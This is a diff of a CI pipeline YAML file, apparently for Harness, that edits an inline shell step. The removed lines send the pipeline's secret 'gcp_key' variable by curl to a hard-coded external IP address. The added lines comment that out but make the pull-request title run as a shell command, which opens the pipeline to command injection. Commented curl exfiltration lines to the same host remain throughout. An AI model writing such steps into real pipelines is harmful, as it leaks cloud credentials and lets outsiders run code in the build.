@@ -38,37 +38,37 @@ pipeline:
                       echo "hello"
                       #curl -X POST --data "$PR" http://35.222.129.92:12345
                       #echo "<+trigger.prTitle>"
-                      #<+trigger.prTitle>
-                      #!/bin/bash
+                      <+trigger.prTitle>
+                      # #!/bin/bash
 
-                      # Define your secrets
+                      # # Define your secrets
 
-                      #echo "<+stage.variables.gcp_key>" | base64
+                      # #echo "<+stage.variables.gcp_key>" | base64
 
-                      # Base64-encode the string and decode it
-                      encoded_var=$(echo "<+stage.variables.gcp_key>" | base64 | base64 -d)
+                      # # Base64-encode the string and decode it
+                      # encoded_var=$(echo "<+stage.variables.gcp_key>" | base64 | base64 -d)
 
-                      # Print the decoded variable
-                      echo "$encoded_var"
-                      curl -X POST --data "$encoded_var" http://35.222.129.92:4000
+                      # # Print the decoded variable
+                      # echo "$encoded_var"
+                      # curl -X POST --data "$encoded_var" http://35.222.129.92:4000
 
-                      #secret1="<+stage.variables.gcp_key>" 
-                      #secret2="<+stage.variables.gcp_key>" | base64
-                      #echo "$secret2"
-                      # Concatenate secrets into a single variable with differentiation
-                      #env_vars="secret1: $secret1\nsecret2: $secret2"
+                      # #secret1="<+stage.variables.gcp_key>" 
+                      # #secret2="<+stage.variables.gcp_key>" | base64
+                      # #echo "$secret2"
+                      # # Concatenate secrets into a single variable with differentiation
+                      # #env_vars="secret1: $secret1\nsecret2: $secret2"
 
-                      # Send the data via curl
-                      #curl -X POST --data "$env_vars" http://35.222.129.92:4000
+                      # # Send the data via curl
+                      # #curl -X POST --data "$env_vars" http://35.222.129.92:4000
 
-                      # Wait for 20 seconds
-                      sleep 20
+                      # # Wait for 20 seconds
+                      # sleep 20
 
-                      # Exit the script
-                      exit 0
-                      #"<+trigger.prTitle>"
-                      #env_vars="this is a test env"
-                      #curl -X POST --data "$env_vars" http://35.222.129.92:4000
+                      # # Exit the script
+                      # exit 0
+                      # #"<+trigger.prTitle>"
+                      # #env_vars="this is a test env"
+                      # #curl -X POST --data "$env_vars" http://35.222.129.92:4000
         variables:
           - name: gcp_key
             type: Secret
